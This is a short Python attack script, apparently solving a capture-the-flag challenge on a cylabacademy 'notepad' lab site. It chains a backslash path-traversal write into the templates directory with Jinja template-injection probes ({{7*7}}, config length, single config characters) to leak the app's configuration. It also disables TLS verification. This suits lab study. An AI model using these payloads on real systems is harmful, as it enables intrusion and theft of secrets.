import sys, requests, re
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
requests.packages.urllib3.disable_warnings()
BASE = "https://notepad.mars.cylabacademy.net"
S = requests.Session()
S.headers.update({"User-Agent": "Mozilla/5.0"})


def test(tpl, label):
    content = "\\..\\templates\\errors\\t" + tpl
    print(f"\n--- {label}: {tpl[:60]} ---")
    r = S.post(BASE + "/new", data={"content": content}, timeout=25, verify=False, allow_redirects=False)
    loc = r.headers.get("Location", "")
    m = re.search(r"/static/(.+)\.html$", loc)
    if not m:
        print("  POST echec:", loc[:150])
        return
    name = m.group(1).split("/")[-1]
    print("  fichier:", name[:80])
    r2 = S.get(BASE + "/", params={"error": name[: -len(".html")]}, timeout=25, verify=False)
    body = r2.text
    if "t\\.." in body or "t" in body:
        idx = body.find("<h2>")
        print("  corps avant <h2>:", repr(body[:idx][-250:]))
    else:
        print("  reponse:", body[:200])


test("{{7*7}}", "multiplication")
test("{{config|string|length}}", "longueur config")
test("{{(config|string)[73]}}", "char 73")
